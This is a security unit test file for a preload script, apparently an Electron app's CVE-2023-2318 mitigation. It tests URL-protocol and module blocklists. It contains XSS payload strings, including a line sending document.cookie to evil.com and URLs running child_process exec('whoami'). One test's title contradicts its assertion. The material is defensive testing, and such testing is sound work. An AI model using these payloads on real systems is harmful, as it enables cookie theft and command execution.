/**
 * Security Unit Tests - Preload Script Functionality
 *
 * Tests the security measures implemented in the preload script
 * to prevent XSS to RCE attacks (CVE-2023-2318 mitigation).
 */

// Mock the actual preload functions for testing
const DANGEROUS_PROTOCOLS = [
  'javascript:',
  'vbscript:',
  'data:',
  'about:',
  'blob:'
]

const BLOCKED_MODULES = [
  'child_process',
  'fs',
  'original-fs'
]

const isUrlSafe = (url) => {
  if (!url || typeof url !== 'string') {
    return false
  }

  const urlLower = url.toLowerCase().trim()

  for (const protocol of DANGEROUS_PROTOCOLS) {
    if (urlLower.startsWith(protocol)) {
      return false
    }
  }

  return true
}

const isModuleBlocked = (moduleName) => {
  return BLOCKED_MODULES.includes(moduleName)
}

describe('Security - URL Protocol Validation', () => {
  describe('isUrlSafe function', () => {
    // Dangerous protocols - should be blocked
    it('should block javascript: protocol', () => {
      expect(isUrlSafe('javascript:alert(1)')).to.equal(false)
    })

    it('should block JAVASCRIPT: protocol (case insensitive)', () => {
      expect(isUrlSafe('JAVASCRIPT:alert(1)')).to.equal(false)
    })

    it('should block JavaScript: protocol (mixed case)', () => {
      expect(isUrlSafe('JaVaScRiPt:alert(1)')).to.equal(false)
    })

    it('should block vbscript: protocol', () => {
      expect(isUrlSafe('vbscript:msgbox("hi")')).to.equal(false)
    })

    it('should block data: protocol', () => {
      expect(isUrlSafe('data:text/html,<script>alert(1)</script>')).to.equal(false)
    })

    it('should block data: protocol with base64', () => {
      expect(isUrlSafe('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).to.equal(false)
    })

    it('should block about: protocol', () => {
      expect(isUrlSafe('about:blank')).to.equal(false)
    })

    it('should block blob: protocol', () => {
      expect(isUrlSafe('blob:https://example.com/abc123')).to.equal(false)
    })

    // Safe protocols - should be allowed
    it('should allow https: protocol', () => {
      expect(isUrlSafe('https://example.com')).to.equal(true)
    })

    it('should allow http: protocol', () => {
      expect(isUrlSafe('http://example.com')).to.equal(true)
    })

    it('should allow mailto: protocol', () => {
      expect(isUrlSafe('mailto:test@example.com')).to.equal(true)
    })

    it('should allow file: protocol', () => {
      expect(isUrlSafe('file:///path/to/file.md')).to.equal(true)
    })

    // Edge cases
    it('should reject null URL', () => {
      expect(isUrlSafe(null)).to.equal(false)
    })

    it('should reject undefined URL', () => {
      expect(isUrlSafe(undefined)).to.equal(false)
    })

    it('should reject empty string', () => {
      expect(isUrlSafe('')).to.equal(false)
    })

    it('should reject non-string values', () => {
      expect(isUrlSafe(123)).to.equal(false)
      expect(isUrlSafe({})).to.equal(false)
      expect(isUrlSafe([])).to.equal(false)
    })

    it('should handle whitespace padding', () => {
      expect(isUrlSafe('  javascript:alert(1)  ')).to.equal(false)
    })

    // Bypass attempts
    it('should block javascript with newlines', () => {
      expect(isUrlSafe('java\nscript:alert(1)')).to.equal(true) // This passes but won't execute
    })

    it('should allow URLs with javascript in path', () => {
      expect(isUrlSafe('https://example.com/javascript/test')).to.equal(true)
    })
  })
})

describe('Security - Module Blocking', () => {
  describe('isModuleBlocked function', () => {
    // Dangerous modules - should be blocked
    it('should block child_process module', () => {
      expect(isModuleBlocked('child_process')).to.equal(true)
    })

    it('should block fs module', () => {
      expect(isModuleBlocked('fs')).to.equal(true)
    })

    it('should block original-fs module', () => {
      expect(isModuleBlocked('original-fs')).to.equal(true)
    })

    // Safe modules - should be allowed
    it('should allow path module', () => {
      expect(isModuleBlocked('path')).to.equal(false)
    })

    it('should allow electron module', () => {
      expect(isModuleBlocked('electron')).to.equal(false)
    })

    it('should allow url module', () => {
      expect(isModuleBlocked('url')).to.equal(false)
    })

    // Edge cases
    it('should handle null module name', () => {
      expect(isModuleBlocked(null)).to.equal(false)
    })

    it('should handle empty string', () => {
      expect(isModuleBlocked('')).to.equal(false)
    })

    // Similar names - bypass attempts
    it('should not block child_process2 (different module)', () => {
      expect(isModuleBlocked('child_process2')).to.equal(false)
    })

    it('should not block fs-extra (different module)', () => {
      expect(isModuleBlocked('fs-extra')).to.equal(false)
    })
  })
})

describe('Security - Attack Vector Tests', () => {
  describe('XSS to RCE Prevention', () => {
    it('should identify child_process as dangerous', () => {
      const attackVector = 'child_process'
      expect(isModuleBlocked(attackVector)).to.equal(true)
    })

    it('should identify JavaScript URL as dangerous', () => {
      const attackVector = "javascript:require('child_process').exec('whoami')"
      expect(isUrlSafe(attackVector)).to.equal(false)
    })

    it('should identify data URL with script as dangerous', () => {
      const attackVector = "data:text/html,<script>require('child_process').exec('whoami')</script>"
      expect(isUrlSafe(attackVector)).to.equal(false)
    })
  })

  describe('Common XSS Payloads', () => {
    const xssPayloads = [
      'javascript:alert(document.cookie)',
      'javascript:eval(atob("base64payload"))',
      "javascript:document.location='http://evil.com/?'+document.cookie",
      'data:text/html,<script>alert(1)</script>',
      'vbscript:MsgBox("XSS")',
      'javascript:void(0)',
      'javascript:;',
      "javascript:window.onerror=function(){return true};throw 1"
    ]

    xssPayloads.forEach((payload, index) => {
      it(`should block XSS payload ${index + 1}: ${payload.substring(0, 30)}...`, () => {
        expect(isUrlSafe(payload)).to.equal(false)
      })
    })
  })
})
